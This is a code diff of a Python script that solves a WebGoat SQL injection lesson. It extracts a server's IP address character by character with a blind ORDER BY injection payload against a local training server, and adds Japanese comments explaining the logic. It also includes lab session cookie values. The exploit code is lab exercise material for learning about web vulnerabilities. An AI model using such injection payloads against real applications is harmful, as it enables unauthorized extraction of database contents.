@@ -21,7 +21,7 @@ def sql_injection_adv_5():
     isfinish = False
 
     headers={
-        'Cookie': 'JSESSIONID=O6tg2QHoX_AKTTZuF4M-1vyjOouTBFZc3V-uksMv'
+        'Cookie': 'JSESSIONID=JIe_DR7kvaw0TJFQRszx9n3TD2pir03B17oNgj4a'
         # 'Cookie': 'JSESSIONID=hrY1H16D4yk_NqheEs2CgzBaNX8tQ-3wL8dICOjQ' 
         # Example here ^
     }
@@ -29,23 +29,25 @@ def sql_injection_adv_5():
     #下のrequests.get()内で指定するURLと対応するCOOKIEのJSESSIONID
 
     while True:
-        url='http://127.0.0.1:8080/WebGoat/SqlInjectionMitigations/servers?column=case+when+(substring((select+ip+from+servers+where+hostname%3d\'webgoat-prd\'),{},1)%3d{})+then+id+else+hostname+end'.format(index,numbers[numbers_num])
+        url='http://127.0.0.1:8080/WebGoat/SqlInjectionMitigations/servers?column=case+when+(substring((select+ip+from+servers+where+hostname%3d\'webgoat-prd\'),{},1)%3d\'{}\')+then+id+else+hostname+end'.format(index,numbers[numbers_num])
+        # ipアドレスの.まで評価する場合は、numbers[numbers_num]フォーマット指定の部分も''で囲わないと数値として評価されて.が正しく評価されなかった
 
         r= requests.get(url,headers=headers)
         try:
             response =json.loads(r.text)
-            
+            # response[num][key]で特定のデータを指定可能
+            # numで何番目のresponseかリストの中から指定
+            # keyは連想配列によってどのデータを取り出すか指定できる
         except:
             print("Wrong JSESSIONID")
             return
 
+        #idが1から順に並んでいなければnumbers_numをインクリメントしてもう一度検証
+        #ORDERの特性上、正しい数値が与えられていれば順に並んでいるはず
         for i in range(4):
             if response[i]['id'] != str(i+1):
                 numbers_num+=1 
-                break
-            #idが1から順に並んでいなければnumbers_numをインクリメントしてもう一度検証
-            #ORDERの特性上、正しい数値が与えられていれば順に並んでいるはず
-                
+                break 
             if i == 3:
                 print(numbers[numbers_num])
                 result= result+numbers[numbers_num]
